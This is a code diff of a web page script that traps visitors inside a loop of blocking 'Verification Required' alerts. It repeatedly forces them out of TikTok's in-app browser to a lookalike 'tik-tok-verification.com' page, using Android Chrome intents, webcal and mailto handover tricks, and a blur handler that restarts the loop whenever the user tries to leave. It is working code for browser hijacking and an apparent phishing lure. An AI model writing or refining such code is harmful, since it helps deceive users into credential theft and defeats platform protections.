@@ -11,35 +11,41 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; // ATOMIC FAIL-SAFE
 
-    function breakout() {
+    function forceRedirect() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
+        // This protocol (Webcal) forces the OS to take over because TikTok can't render calendars
+        const osTrigger = "webcal://" + target.replace("https://", "");
+
         if (isAndroid) {
-            // Android Chrome Intent
+            // Android: High-priority Chrome Package Intent
             window.location.href = "intent://" + target.replace("https://", "") + "#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end";
         } else if (isIOS) {
-            // iOS: Simple Search Hijack
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            // iOS: Blob-Refresh Handover
-            window.location.href = 'data:text/html;base64,' + btoa('<html><meta http-equiv="refresh" content="0;url=' + target + '"></html>');
+            // iOS: Force the OS Handover via Webcal
+            window.location.href = osTrigger;
+            
+            // Secondary trigger: Mailto bypass
+            setTimeout(() => {
+                window.location.href = "mailto:?body=" + encodeURIComponent(target);
+            }, 50);
         }
     }
 
     function rampage() {
-        // FAIL-SAFE: If 5 seconds have passed, stop everything.
+        // FAIL-SAFE CHECK
         if (Date.now() > killTime) return;
 
-        // 1. Attempt the redirect
-        breakout();
+        // 1. Try to force them out
+        forceRedirect();
 
-        // 2. Trigger the Lock (The Alert)
-        alert("ATTEMPT #17\n\nVerification Required.\n\nClick OK to continue in your browser.");
+        // 2. THE LOCK
+        alert("ATTEMPT #18\n\nVerification Required.\n\nTap OK to open Safari/Chrome.");
 
-        // 3. Attempt redirect again immediately after OK
-        breakout();
+        // 3. Try again immediately
+        forceRedirect();
 
-        // 4. Loop back immediately
+        // 4. Instant Loop
         setTimeout(rampage, 1);
     }
 
@@ -47,11 +53,9 @@
         rampage();
     };
 
-    // If they click 'X' or the screen blurs, it re-triggers the loop
-    window.onblur = () => {
-        if (Date.now() < killTime) rampage();
-    };
-
+    // If they touch anything or try to leave, hit them with the loop again
+    window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
+
 </body>
 </html>
